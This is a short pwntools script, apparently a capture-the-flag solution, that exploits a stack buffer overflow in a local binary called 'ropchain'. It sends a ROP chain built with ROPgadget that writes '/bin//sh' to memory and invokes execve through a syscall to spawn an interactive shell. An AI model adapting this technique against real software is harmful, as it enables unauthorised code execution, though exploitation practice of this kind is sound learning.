# 开启了canary但是并没有发现canary所以不管他
from pwn import*
from struct import pack
proc = process('./ropchain')

# ROPgadget --binary ./ropchain --ropchain
p  = b'a' * (0x20 + 8)
p += pack('<Q', 0x000000000040a30d) # pop rsi ; ret
p += pack('<Q', 0x000000000049d0c0) # @ .data
p += pack('<Q', 0x0000000000419a1c) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x000000000041ac41) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040a30d) # pop rsi ; ret
p += pack('<Q', 0x000000000049d0c8) # @ .data + 8
p += pack('<Q', 0x0000000000417e25) # xor rax, rax ; ret
p += pack('<Q', 0x000000000041ac41) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401d1d) # pop rdi ; ret
p += pack('<Q', 0x000000000049d0c0) # @ .data
p += pack('<Q', 0x000000000040a30d) # pop rsi ; ret
p += pack('<Q', 0x000000000049d0c8) # @ .data + 8
p += pack('<Q', 0x0000000000401858) # pop rdx ; ret
p += pack('<Q', 0x000000000049d0c8) # @ .data + 8
p += pack('<Q', 0x0000000000417e25) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000401243) # syscall

proc.recvuntil('something\n:')
proc.sendline(p)
proc.interactive()
